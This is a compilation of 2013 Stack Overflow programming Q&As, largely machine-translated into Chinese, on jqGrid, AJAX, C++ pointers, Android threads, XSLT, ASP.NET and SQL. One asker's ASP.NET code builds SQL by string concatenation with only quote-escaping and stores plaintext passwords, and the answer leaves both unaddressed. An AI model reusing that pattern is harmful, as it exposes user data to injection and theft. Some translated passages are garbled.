               { name: 'referralId', index: 'referralId', key: true, width: 25 },
               { name: 'closureDate', index: 'closureDate', width: 30, formatter: function(cellValue){return $.datepicker.formatDate('mm-dd-yy', new Date(cellValue));}},                   
               { name: 'finalAction', index: 'finalAction', width: 30 },
               { name: 'summary', index: 'summary', width: 50, cellattr: function (rowId, tv, rawObject, cm, rdata) { return 'style="white-space: normal;line-height: 1.3em;"'; } },
               { name: 'title', index: 'title', width: 30 },
               { name: 'councilNm', index: 'councilNm', width: 30 },
               { name: 'retract', index: 'retract', width: 30, formatter: function (cellvalue, options, rowObject) {return '<a href="'+ contextRoot +'dart/approved">Retract</a>';} }
    ],loadComplete: function() {
        if (this.rows.length > 1) {
            // select the first row of the grid
            $(this).jqGrid("setSelection", this.rows[1].id, true);
        }
        referralsCnt = $(this).getGridParam("records");
        rowCount = $(this).getGridParam("reccount");            
        if(referralsCnt > rowCount) {
            $("#viewAllReferrals").show();
        }
        $(this).triggerHandler("reloadGrid");   
    },loadError: function(xhr,st,err) {
        alert(err);
    },onSelectRow : function(rowid) {
        $("#referralDetailsTab").load(contextRoot + "refDetailsTab?refId=" + rowid);
    },
    pager: '#discActionHistPager',
    sortorder: 'desc',
    sortname: 'closureDate',
    gridview: true,
    viewrecords: true,
    loadonce: true,
    hoverrows : true,
    autowidth: true,
    height: 'auto',
    rowNum: 3,
    shrinkToFit: true,
    altRows:true
}); 
```

示例 JSON 数据：

```
{"rows":[{"referralId":"2345","closureDate":1366395788927,"finalAction":"","summary":"","title":"TitleName","councilNm":"CouncilName"},{"referralId":"23455660","closureDate":1366395788927,"finalAction":"Reprimand","summary":"Reprimand and letter of reecommendiation recinded","title":"TitleName","councilNm":"CouncilName"},{"referralId":"23455661","closureDate":1366395788927,"finalAction":"Reprimand","summary":"Reprimand and letter of reecommendiation recinded","title":"TitleName","councilNm":"CouncilName"},{"referralId":"23455662","closureDate":1366395788927,"finalAction":"Reprimand","summary":"Reprimand and letter of reecommendiation recinded","title":"TitleName","councilNm":"CouncilName"},{"referralId":"23455663","closureDate":1366395788927,"finalAction":"Reprimand","summary":"Reprimand and letter of reecommendiation recinded","title":"TitleName","councilNm":"CouncilName"},{"referralId":"23455664","closureDate":1366395788927,"finalAction":"Reprimand","summary":"Reprimand and letter of reecommendiation recinded","title":"TitleName","councilNm":"CouncilName"}],"page":0,"total":0,"records":0} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T21:04:35.263

我认为对于什么是 rowid 存在很大的误解，并且 jqGrid*总是*需要`id`对每一行都具有唯一性。

jqGrid 旨在在网格中显示来自后端（来自数据库）的项目。你的情况正是如此。特别是对于*jqGrid 的大多数回调将 rowid 作为参数*的情况。如果您正确填充网格，则 rowid 应该与保存数据的数据库表中的值相同`id`。

只有当 jqGrid 有**错误的输入数据**且不包含 id 信息时，jqGrid 才必须使用一些本地生成的唯一 id。由于与旧版本的 jqGrid 的兼容性问题，它仍然使用数字 1、2、3 作为 rowid。

什么是rowid？网格是基于 HTML 构建的`<table>`。表格的主体包含`<tr>`HTML 格式的行。jqGrid 的实现必须为元素的`id`属性`<tr>`（行的id）分配一些唯一值。将文档中的值命名`id`为 rowids。

在您的情况下，您应该做的是在列的定义`id: "referralId"`中`jsonReader`包含您使用的或（最好两者都包含）包含`key: true`属性`referralId`：

```
{ name: 'referralId', key: true, width: 25, sorttype: 'integer' } 
```

`onSelectRow`更改后，您可以将回调代码简化为

```
onSelectRow: function (rowid) {
    $("#referralDetailsTab").load(contextRoot + "refDetailsTab?refId=" + rowid);
} 
```

或者

```
onSelectRow: function (rowid) {
    $("#referralDetailsTab").load(contextRoot + "refDetailsTab?refId=" +
        encodeURIComponent(rowid));
} 
```

使代码更清晰，并且独立于哪个值具有 rowid。

jqGrid 中没有“默认选定行”。如果要在加载网格后选择网格上的第一行，可以将代码替换为`gridComplete`以下

```
loadComplete: function () {
    if (this.rows.length > 1) {
        // select the first row of the grid
        $(this).jqGrid("setSelection", this.rows[1].id, true);
    }
} 
```

（见[我的回答](https://stackoverflow.com/a/15439276/315935)，我描述了为什么我推荐使用`loadComplete`而不是`gridComplete`）

我希望在更改后您描述的问题将消失。

# jquery - JQuery 每个函数都带有 ajax 循环

> ID：16091333
> 
> 赞同：1
> 
> 时间：2013-04-18T19:18:18.377
> 
> 标签：jquery, ajax, loops, alert, each

大家好，这是我在这个论坛的第一篇文章。

我有这个功能

```
function TestePresenca(){
var msg = ''
$('#teste tbody tr').each(function(){
    var MemberId;
    var ClassId;
    var PresenceDate;
    var OClasse;

    var DataPre = $('#data_presenca').val();
    var TotBiblia = $('#tot_biblia').val();
    var TotOferta = $('#tot_ofertas').val();

    $(this).find('td').each(function(){
        if($(this).index() == 0){
            MemberId = $(this).text();
        }

        if($(this).index() == 3){
            $(this).closest('tr').find("select").each(function(){
                ClassId = this.value;
            })
        }

        if($(this).index() == 4){
            OClasse = $(this).text();
        }           
    });

    $.ajax({
        type: 'POST',
        url: BASE + '/save_list_presence',
        data: {pMemberId: MemberId, pClassId: ClassId, pOClasse: OClasse, pDataPre: DataPre, pTotBiblia: TotBiblia, pTotOferta: TotOferta},
        success: function(retorno){
            msg += retorno;
        },
        error: function(xhr, ajaxOptions, thrownError) {
            alert('Erro!');
        }
    });
});
alert(msg);} 
```

我的问题是“alert（msg）”在没有消息的情况下触发，在调试时我看到它的触发，然后每个和 ajax 执行之后，“msg”变量在最后被填充，但是警报之前被触发。

有人知道我该如何解决吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:20:30.313

AJAX 是异步的——它下面的代码可能在 AJAX 调用完成之前运行。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-18T19:22:07.957

Try to use this `async: false` in your ajax call:

```
$.ajax({
        type: 'POST',
        url: BASE + '/save_list_presence',
        async: false,
        ... 
```

From the [**jQuery.ajax() API Docs**](http://api.jquery.com/jQuery.ajax/)

> By default, all requests are sent asynchronously (i.e. this is set to true by default). If you need synchronous requests, set this option to false. Cross-domain requests and dataType: "jsonp" requests do not support synchronous operation. Note that synchronous requests may temporarily lock the browser, disabling any actions while the request is active.

# c++ - C++ 表达式必须具有指向对象的类型

> ID：16091335
> 
> 赞同：8
> 
> 时间：2013-04-18T19:18:34.303
> 
> 标签：c++, pointers, struct

亲爱的 stackoverflow 有用的社区，

这是我第一个使用带有结构的指针的程序，尽管进行了大量研究，但我还是找不到我要找的东西。如果这已经得到回应，请原谅我。

我有一个学校项目，我必须定义结构而不是使用指针数组来存储数据。在这个循环中，我收到以下错误：

> 表达式必须具有指向对象的类型

```
for (int i = 0; i < nbClerk; i++)
            {
                cout<<"Number of hours: ";
                cin>>c_info->hoursWorked[i];
            }
            break; 
```

这是整个代码。非常感谢您的帮助

```
#include <iostream>
#include <string>
#include <iomanip>
using namespace std;

//structure defining Employee
struct Employee
{
    int hoursWorked;
    int hourRate;
    double overtime;
    string name;
    int empID;
};

//Function collecting and calculating info
void employeeInfo(int nbOperator, int nbClerk){

    char classOfEmployee;

    Employee *c_info;
    c_info = new (nothrow) Employee[nbClerk];

    Employee *o_info;
    o_info = new (nothrow) Employee[nbOperator];

    cout<<"Select the class of employee (C=Clerk, O=Operator)";
    cin>>classOfEmployee;

    switch (tolower(classOfEmployee))
    {
    case 'c': 
        for (int i = 0; i < nbClerk; i++)
        {
            cout<<"Number of hours: ";
            cin>>c_info->hoursWorked[i];
        }
        break;
    }
}

int main(){
    int nb1,nb2;
    cout<<"Nb Employee and nb of nb of operator: ";
    cin>>nb1>>nb2;
    nbEmployee(nb1, nb2);
    system("pause");
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-18T19:20:26.357

你可能的意思是：

```
c_info[i].hoursWorked; 
```

因为`c_info`是一个数组，通过这样做`c_info[i]`你将访问数组中类的`i`第-个实例（对象），然后通过运算符获取。`Employee``c_info``hoursWorked``.`

现在您可以清楚地看到您的变体根本没有意义，因为`hoursWorked`它只是一个整数类型而不是数组，因此您不能`[]`对其应用运算符。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-18T19:25:58.533

`c_info`是一个指向员工的指针。您可以将单个分配的对象分配给这样的指针，或者在您的情况下分配多个对象（`new`使用数组语法）。所以它指向一个雇员数组。

您取消了对该指针的引用。由于它指向一个（多个）Employees 数组，它也指向第一个条目。然后您访问一个整数成员变量，这仍然是可能的。但随后您尝试对`[]`整数值使用数组下标运算符 ( )，这是不可能的。

您可能打算访问已`i`分配数组的 -th 条目的成员变量。所以你必须扭转这种局面：首先使用数组下标运算符，然后访问该特定 Employee 上的成员。

`c_info[i]`用低级的话表示：取指针`c_info`，加上`i`它指向的类型的大小（因此它指向`i`第 -th 条目）并取消引用该地址。这意味着，这`c_info[i]`实际上是`i`第 -th 索引处的 Employee（但不是指针）。

然后，您想访问该员工的成员。如果它仍然是指针，则必须使用箭头运算符，但由于您使用了数组下标运算符 ( `[i]`)，因此您已经取消了对它的引用，因此点运算符是正确的：

```
cin >> c_info[i].hoursWorked; 
```

# java - Android中运行新线程和UI线程的方法是什么？

> ID：16091341
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:18:50.833
> 
> 标签：java, android, multithreading

据我所知，当我们在 android 中运行进程时，它们从主线程开始。当我们做一些较重的工作时，我们会使用一个新线程。如果我们想修改 UI 外观，我们使用在 UI 上运行。

有人可以向我解释这些线程的作用以及它们是如何使用的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:26:05.297

我会研究以下两件事：

[处理](http://developer.android.com/reference/android/os/Handler.html)程序和[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)

这是一个非常好的 Android 线程资源。[http://www.vogella.com/articles/AndroidBackgroundProcessing/article.html](http://www.vogella.com/articles/AndroidBackgroundProcessing/article.html)

此外，如果您因为要获取一些数据/进行简单的 API 调用而询问，我绝对建议您查看[http://loopj.com/android-async-http/](http://loopj.com/android-async-http/)。这将使您的生活变得更加简单。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T19:36:26.523

主要`Thread`是`UI Thread`. 所以当你开始你的时候，你`Activity`就在`Main (UI) Thread`. 当您想使用单独的线程来执行“繁重的工作”（例如网络进程）时，您有多种选择。`Thread`您可以在您的内部创建一个单独的`Activity`并调用 runOnUiThread 来更新您的`UI`. 您还可以将[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)用于短期操作。根据文档，可能只需要几秒钟的时间。这是一个简短的例子：

```
public class TalkToServer extends AsyncTask<String, String, String> {
@Override
protected void onPreExecute() {
    super.onPreExecute();
}

@Override
protected void onProgressUpdate(String... values) {
    super.onProgressUpdate(values);

}

@Override
protected String doInBackground(String... params) {
//do your work here
    return something;
}

@Override
protected void onPostExecute(String result) {
    super.onPostExecute(result);
       // do something with data here-display it or send to mainactivity 
```

你会从

```
TalkToServer myAsync = new TalkToServer() //can add params if you have a constructor  
myAsync.execute() //can pass params here for `doInBackground()` method 
```

只要确保不要尝试更新方法`UI`。`doInBackground()`使用其他任何一个或将数据传递回`Activity`方法。如果你的`AsyncTask`类是 innner 方法，`Activity`那么你可以使用它`context`来更新`UI`. 如果它在自己的文件中，那么您将需要传递`context`给它的构造函数，例如

```
TalkToServer myAsync = new TalkToServer(this); 
```

您可能还想阅读这篇文章

[无痛穿线](http://android-developers.blogspot.com/2009/05/painless-threading.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-18T19:26:16.157

UI 线程和主线程只是同一个线程的不同名称。

应用程序的所有 UI 膨胀都在这个主线程上完成。我们将“较重”的工作委托给其他线程的原因是因为我们不希望这些操作减慢 UI 的响应速度和膨胀时间。

您将希望在主线程上运行任何更改 UI 或修改 UI 使用的对象的操作。

AsyncTask 的示例

```
package com.wolfdev.warriormail;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;

public class LoginActivity extends Activity implements OnClickListener{
    private Button loginButton;
    private EditText eText;
    private EditText pText;
    private CheckBox box;
    private String user; 
    private String pass;

    @Override
    public void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.login);

            //Initialize UI objects on main thread
        loginButton = (Button) findViewById(R.id.button1);
        loginButton.setOnClickListener(this);
        eText = (EditText) findViewById(R.id.editText1);
        pText = (EditText) findViewById(R.id.editText2);
        eText.clearFocus();
        pText.clearFocus();
        Animation fadeIn = AnimationUtils.loadAnimation(this,R.anim.fadeanimation);
        Animation slideIn = AnimationUtils.loadAnimation(this, R.anim.slideanimation);
        eText.startAnimation(slideIn);
        pText.startAnimation(slideIn);
        box = (CheckBox)findViewById(R.id.checkBox1);
        box.startAnimation(fadeIn);
        login.startAnimation(fadeIn);
    }

    @Override
    public void onClick(View v) {
        user = email.getText().toString();
        password = pass.getText().toString();

    }

    class LoginTask extends AsyncTask<Void,Void,Void>{
            @Override
            protected Void doInBackground(Void... args){
                    /* Here is where you would do a heavy operation
                    *  In this case, I want to validate a users
                    *  credentials.  If I would do this on the main
                    *  thread, it would freeze the UI.  Also since
                    *  this is networking, I am forced to do this on
                    *  a different thread.
                    */

                    return null;
            }

            @Override
            protected void onPostExecute(Void result){
                     /* This function actually runs on the main
                     * thread, so here I notify the user if the
                     * login was successful or if it failed.  If
                     * you want update the UI while in the background
                     * or from another thread completely, you need to
                     * use a handler.
                     */
            }
    }
} 
```

# java - 如何强制 SWT 中的元素以英文显示？

> ID：16091348
> 
> 赞同：1
> 
> 时间：2013-04-18T19:19:19.767
> 
> 标签：java, localization, swt

我是巴西人，我正在开发一个使用 SWT 的应用程序。但我需要 SWT 中的元素始终以英语显示给用户。目前他们为我出现了葡萄牙语，因为我的操作系统是葡萄牙语。那么不管操作系统如何，是否有可能强制所有元素保持英文？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:39:56.773

大多数 SWT`Widget`依赖于操作系统，这意味着它们使用本机操作系统元素。所有非模拟小部件都是这种情况。您将无法更改这些语言（即选择与所选操作系统语言不同的语言）。

对于模拟小部件，[此](http://www.eclipse.org/swt/language.php)链接说明了如何强制使用某种语言。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T11:31:47.233

通常建议在一个应用程序中支持[国际化和本地化](http://en.wikipedia.org/wiki/Internationalization_and_localization)。看看`java.util.ResourceBundle`它的支持类。

例如，我的操作系统上的默认语言是英语，但使用`java.util.ResourceBundle`API，我可以针对葡萄牙语或任何其他客户。

## 代码

### 消息类

```
package com.sample;
import java.util.MissingResourceException;
import java.util.ResourceBundle;

public class Messages {
    private static final String BUNDLE_NAME = "com.sample.messages"; //$NON-NLS-1$
    private static final ResourceBundle RESOURCE_BUNDLE = ResourceBundle
            .getBundle(BUNDLE_NAME);
    private Messages() {
    }
    public static String getString(String key) {
        try {
            return RESOURCE_BUNDLE.getString(key);
        } catch (MissingResourceException e) {
            return '!' + key + '!';
        }
    }
} 
```

### 测试班

```
package com.sample;
import org.eclipse.swt.SWT;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Button;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Shell;
public class Test {
    public static void main(String[] args) {
        Display display = new Display();
        Shell shell = new Shell(display, SWT.CLOSE);
        shell.setLayout(new GridLayout(1, false));
        shell.setLayoutData(new GridData(SWT.FILL, SWT.FILL, true, false));
        shell.setText(Messages.getString("Test.TITLE")); //$NON-NLS-1$
        Button button = new Button(shell, SWT.PUSH);
        button.setLayoutData(new GridData(SWT.FILL, SWT.FILL, true, false));
        button.setText(Messages.getString("Test.GREETINGS")); //$NON-NLS-1$

        shell.pack();
        shell.open();
        while (!shell.isDisposed()) {
            if (!display.readAndDispatch())
                display.sleep();
        }
        display.dispose();
    }
} 
```

### message.properties 文件

```
Test.GREETINGS=Olá Mundo \!\!
Test.TITLE=\u0644\u064A\u0644\u0629 \u0633\u0639\u064A\u062F\u0629 
```

## 输出

![在此处输入图像描述](https://i.stack.imgur.com/ahsdS.png)

**注意 -**标题为阿拉伯语，按钮文本为葡萄牙语。

# c# - 在 .NET 4.5 中加载大型 XSLT 时出现异常“样式表太复杂”

> ID：16091351
> 
> 赞同：6
> 
> 时间：2013-04-18T19:19:41.083
> 
> 标签：c#, xslt, .net-4.5

尝试加载 XSLT 样式表时出现异常。XSLT 样式表非常大（几乎 8,000 行）。不幸的是，我对此没有任何控制权，我无法重构样式表以使其更小。

我们最近升级到 .Net Framework 4.5。以下命令在升级之前运行良好（我们使用的是 .Net Framework 4.0）。升级后，我们收到一条`XsltException`“样式表太复杂”的`transform.Load`在线信息。

我希望有一些新设置会说“让这个命令像在 4.0 中那样工作”，但我在任何地方都找不到任何东西。

有人知道为什么这可能突然成为 4.5 版本中的问题吗？如何解决？

```
XslCompiledTransform transform = new XslCompiledTransform();
transform.Load(XmlReader.Create(report), new XsltSettings { EnableScript = true }, new XmlUrlResolver()); 
```

`report`是一个包含大型 XSLT 样式表的 MemoryStream。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-05-02T14:54:33.743

原来这是 .Net Framework 4.5 中的一个功能/缺陷。来自微软的消息...

*我们最近在修补程序汇总中发布了一个修复程序。请参阅[http://support.microsoft.com/kb/2828843](http://support.microsoft.com/kb/2828843)了解 .NET Framework 4.0 和[http://support.microsoft.com/kb/2828841](http://support.microsoft.com/kb/2828841)了解 .NET Framework 4.5。*

然后将其添加到您的配置文件中，问题应该会消失。

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <configSections>
    <sectionGroup name="system.xml">
      <section name="xslt" type="System.Xml.XmlConfiguration.XsltConfigSection, System.Xml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false"/>
    </sectionGroup>
  </configSections>
  <system.xml>
    <xslt limitXPathComplexity="false"/>
  </system.xml>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5"/>
  </startup>
</configuration> 
```

这解决了我的问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2018-02-18T11:03:17.407

我遇到了同样的问题，并将其隔离到一个机器生成的具有超过 1500 个 xsl:when-elements 的选择元素中。进一步的测试证明 .NET 4.7 会在 789 个或更多的 when-elements 处给出“太复杂”的异常。

在 app.config 中将 limitXPathComplexity 设置为 false 会导致程序崩溃并引发 StackOverflowException。

.NET Core 2.0 上的相同代码会在 appx 2800 个元素处引发 StackOverflowException。我已经向两个团队报告了这个错误，但不要指望它很快就会被优先考虑。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-03-20T10:55:12.443

我通过将用于键/值映射的数千个 xsl:choose 和 xsl:if 语句替换为外部 xml 文件键/值查找来解决此问题。

这里抄袭的方法 - 下面的学分。

就 XSLT 而言，最好的方法是将查找数据作为 XML 文档，然后您可以使用 XSLT 文档函数加载该文档。例如，如果您的查找 XML 格式为

```
<list>
  <data key="k1" value="value 1"/>
  <data key="k2" value="value 2"/>
  <data key="k3" value="value 3"/>
</list> 
```

然后使用 XSLT 你可以做例如

```
<xsl:variable name="data" select="document('lookup.xml')/list/data"/>

<xsl:for-each select="foo">
  <xsl:value-of select="$data[@key = current()]/@value"/>
</xsl:for-each> 
```

无需 xsl:choose。当然，文档函数不必加载静态文件，它可以向提供 XML 的 HTTP 服务器发出 GET 请求。

学分： [https ://social.msdn.microsoft.com/Forums/en-US/9b5966a1-aa1e-46db-88f8-3f4a9aeadb5b/best-way-to-handle-a-lookup-in-xslt-data-is-已经在数据库中？forum=xmlandnetfx](https://social.msdn.microsoft.com/Forums/en-US/9b5966a1-aa1e-46db-88f8-3f4a9aeadb5b/best-way-to-handle-a-lookup-in-xslt-data-is-already-in-a-database?forum=xmlandnetfx)

[http://etutorials.org/XML/xml+hacks/Chapter+3.+Transforming+XML+Documents/Hack+56+Use+Lookup+Tables+with+XSLT+to+Translate+FIPS+Codes/](http://etutorials.org/XML/xml+hacks/Chapter+3.+Transforming+XML+Documents/Hack+56+Use+Lookup+Tables+with+XSLT+to+Translate+FIPS+Codes/)

# android - 如果我的目标是 4.0+，是否值得使用 actionbarsherlock？

> ID：16091352
> 
> 赞同：0
> 
> 时间：2013-04-18T19:19:55.087
> 
> 标签：android, actionbarsherlock

假设我的目标永远不会低于 4.0，我应该包含并使用 actionbarsherlock 吗？

是否有我遗漏的东西，使用它的原因，或者我将来可能会后悔我的决定的原因？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T19:21:56.263

No. The whole vision behind actionbarsherlock is to provide backward compatibility for the ActionBar.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:26:56.893

来自[ActionBarSharlock的网站](http://actionbarsherlock.com/)

> ActionBarSherlock 是支持库的扩展，旨在通过单个 API 促进在所有版本的 Android 中使用操作栏设计模式。
> 
> 该库将在适当时自动使用本机操作栏，或者会自动围绕您的布局包装自定义实现。这使您可以轻松地为 2.x 及更高版本的每个版本的 Android 开发带有操作栏的应用程序。

这清楚地表明它只是一个包装器，它使用 android actionbar 来支持支持的 api，并在较低的 api 中使用自己的实现来解决兼容性问题。

但是由于您要使用 api 级别 4 或更高级别，因此 android ActionBar 可用。所以使用 ActionBarSharlock 对你来说只是一个开销

# c# - 单击保存按钮时如何将配置文件帐户保存在数据库中？

> ID：16091362
> 
> 赞同：-5
> 
> 时间：2013-04-18T19:20:31.827
> 
> 标签：c#, asp.net

如何将个人资料帐户保存到数据库中。？

我在数据库中保存帐户的功能是 ff：

名字： 姓氏： 地址： 城市： 国家： 年龄： 性别： 状态： 国籍： 职业： 电子邮件地址： 密码：

```
 Save Button 
```

注意：国家 - 我使用国家作为列出所有国家的下拉列表。所以用户只需选择
他/她拥有的国家。性别 - 也是一个下拉列表。用户必须选择值仅限男性或女性状态 - 也是一个下拉列表。用户选择值仅限单身、已婚、丧偶和分居。

任何人都可以使用 asp.net 和 c# 给我这个代码..感谢您的关注。我非常感谢您的努力..它对我有很大帮助..

这是我的代码。请检查我的代码..有一个运行时错误..

受保护的无效Button1_Click（对象发送者，EventArgs e）{

string conn = @"Data Source=.\SQLEXPRESS;AttachDbFilename=|DataDirectory|\Database.mdf;Integrated Security=True;Connect Timeout=30;User Instance=True"; SqlConnection 连接 = 新的 SqlConnection(conn);

```
 string First = TextBox1.Text.Replace("'", "''");
    string Last = TextBox2.Text.Replace("'", "''");
    string Address = TextBox3.Text.Replace("'", "''");
    string City = TextBox4.Text.Replace("'", "''");
    string Country =DropDownList1;
    string Age = TextBox5.Text.Replace("'", "''");
    string Sex = DropDownList2;
    string Status = DropDownList3;
    string Nationality = TextBox6.Text.Replace("'", "''");
    string Occupation = TextBox7.Text.Replace("'", "''");
    string Email = TextBox8.Text.Replace("'", "''");
    string Pass = TextBox9.Text.Replace("'", "''");

    connection.Open();
    string sql = "INSERT INTO [ProfileTbl]([FirstName],[LastName],[Address],[City],[Country],[Age],[Sex],[Status],[Nationality],[Occupation],[EmailAddress],[Password]) Values('" + First + "','" + Last + "','" + Address + "','" + City + "','" + Country + "','" + Age + "','"+ Sex +"','"+ Status +"','"+ Nationality +"','"+ Occupation +"','"+ Email +"','"+ Pass+"')";
    SqlCommand cmd = new SqlCommand(sql, connection);
    cmd.CommandType = CommandType.Text;

    cmd.ExecuteNonQuery();
    connection.Close();

    TextBox1.Text = "";
    TextBox2.Text = "";
    TextBox3.Text = "";
    TextBox4.Text = "";
    TextBox5.Text = "";
    TextBox6.Text = "";
    TextBox7.Text = "";
    TextBox8.Text = "";
    TextBox9.Text = "";
    DropDownList1 = "";
    DropDownList2 = "";
    DropDownList3 = "";
    Response.Redirect("~/Default4.aspx");

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:44:44.630

> 错误 31 无法将类型“System.Web.UI.WebControls.DropDownList”隐式转换为“字符串”错误 34 无法将类型“字符串”隐式转换为“System.Web.UI.WebControls.DropDownList”

正如我在评论中所说的那样。您不能使用这样的下拉列表。
DropDownList 具有用于访问当前选定值的属性

```
string selectedItemValue = dropDownListInstance.SelectedValue; 
```

或者可能：

```
string selectedItemValue = dropDownListInstance.SelectedItem.Text; 
```

# java - Is there a way I can get my spring beans wired together without having them be initialized?

> ID：16091366
> 
> 赞同：0
> 
> 时间：2013-04-18T19:20:36.670
> 
> 标签：java, spring, dependency-injection, autowired

Ideally, I'd like to have Spring instantiate all the beans from my context config, wire them together as specified, but never call init() on any of them. Is this possible?

Something else that might suit my needs: if there's a hook that runs after wiring but before init() is called on any of the beans.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:32:41.310

您可以在构造后实现`InitializingBean`使用`afterPropertiesSet`或使用`@PostConstruct`来做某事，但这并不能保证它是在接线之前，但听起来这不是您正在寻找的答案。

无法保证 Spring 将初始化 bean 的顺序，因为它必须找出最佳的初始化顺序来处理循环引用等问题。

真正保证在连接到另一个 bean 之前发生某些事情的唯一方法是在构造函数中执行它。这就是为什么我总是使用构造函数而不是属性/设置器注入。

# javascript - adding script to my template dynamically - can I do it?

> ID：16091368
> 
> 赞同：1
> 
> 时间：2013-04-18T19:20:47.187
> 
> 标签：javascript, jquery

Can I dynamically add/append some javascript in script tags to an html template - The reason I need to do it is because the user only clicks on this if the user chooses to provide the education information in the first place. Any thoughts? Sorry if this sounds confused as I am confused.

```
var id_add_script = "#more_ed" + add_school_count;

var add_script = "$( id_add_script ).one('click', function() {$( id_add_script   ).hide().append(more_ed_degree_list).show('slow');});";

var add_script_withTags = "<script>" + add_script + "</script>";

$("form").after(add_script_withTags); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:23:20.897

Why not just execute the code?

```
var id_add_script = "#more_ed" + add_school_count;
$( id_add_script ).one('click', function() {
    $( this ).hide().append(more_ed_degree_list).show('slow');
}); 
```

# asp.net - SQL query to check for date but ignore blank fields

> ID：16091370
> 
> 赞同：0
> 
> 时间：2013-04-18T19:21:02.357
> 
> 标签：asp.net, sql, select, getdate

I have an .asp script that runs the following SQL statement;

```
set rstmp = CustomQuery("select * from SysRes_Master where DATEDIFF(day, GETDATE(), DateChkIn)<1") 
```

What this returns on the webpage is any record with a date in the "DateChkIn" field that is older then the days date (current). However, if this field is blank that record is also returned.

How can I modify this so that is still returns the expired record but ignores any records with a blank in the same?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:10:48.157

根据 DateChkIn 的属性，

```
set rstmp = CustomQuery("select * from SysRes_Master where DATEDIFF(day, GETDATE(), DateChkIn) < 1 AND DateChkIn > 0") 
```

或者

```
set rstmp = CustomQuery("select * from SysRes_Master where DATEDIFF(day, GETDATE(), DateChkIn) < 1 AND DateChkIn IS NOT NULL") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:27:16.010

我真的会考虑在你的选择中选择你想要的字段，获得比需要更多的数据是性能调整的第一件事，

如果我正确理解您的问题，您的问题是您也获得了 DateChkln 字段，因此选择您想要的字段应该过滤掉其他字段

如果您有多个带有日期的字段，您可以使用检查空值的合并（谷歌它）

你有什么数据库？mysql？，windows？

# python - PHP 的 geoip_isp_by_name 函数的等价物是什么？

> ID：16091375
> 
> 赞同：0
> 
> 时间：2013-04-18T19:21:31.437
> 
> 标签：python, django, geoip

我需要等效的[geoip_isp_by_name](http://php.net/manual/en/function.geoip-isp-by-name.php)。我正在使用[Django GeoIP](https://docs.djangoproject.com/en/dev/ref/contrib/gis/geoip/)模块。

我搜索了很多，但我找不到该功能。请指教。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:56:41.923

[pygeoip](https://pypi.python.org/pypi/pygeoip/0.2.6)支持使用 GeoIP 数据库进行 ISP 查找。

```
# Normally found under /usr/share/GeoIP/{GeoIP,GeoIPv6}.dat
gi = pygeoip.GeoIP('/path/to/GeoIPISP.dat')
gi.org_by_name('cnn.com')
'Turner Broadcasting System' 
```

GeoIP 数据库的安装过程取决于您的操作系统和发行版。它通常位于您最喜欢的发行版存储库中，位于`geoip-database`. 有关更多信息，请查看[GeoIP 国家数据库安装说明](http://dev.maxmind.com/geoip/install/country)

可悲的是，我无法让它工作，我的 Ubuntu 12.10 和 Debian 6 安装都出现错误，但我不确定我的 GeoIP 数据库是否损坏或模块损坏。你可能会有更好的运气。

```
gi.org_by_name("cnn.com")
Traceback (most recent call last):
  File "<input>", line 1, in <module>
  File "/usr/local/lib/python2.7/dist-packages/pygeoip/__init__.py", line 548, in org_by_name
    return self.org_by_addr(addr)
  File "/usr/local/lib/python2.7/dist-packages/pygeoip/__init__.py", line 531, in org_by_addr
    raise GeoIPError(message)
GeoIPError: Invalid database type, expected Org, ISP or ASNum 
```

**更新**：由于 GeoIP 不起作用（请参阅评论），我使用这些跟踪站点进行了一些尝试。得到了一个适用于 IP 和主机名的 hacky 解决方案。可能不应该用作永久解决方案，但它工作得很好。

```
import html2text
import re
import urllib2

lookup = "thevoid.no" # accepts both hostname and ip

tracer = "http://www.ip-adress.com/ip_tracer/"
pat    = "ISP of this IP \[\?\]:\n\n([a-zA-Z ]+)"
hdr    = {'User-Agent': 'Mozilla/5.0'} # ip-adress.com doesn't accept Python
req    = urllib2.Request(tracer + lookup, headers=hdr)
page   = urllib2.urlopen(req).read()

h = html2text.HTML2Text()
h.ignore_links = True
text = h.handle(page)

try:
    # Hetzner Online AG
    print re.search(pat, text).group(1)
except:
    print "Could not find ISP for", lookup 
```

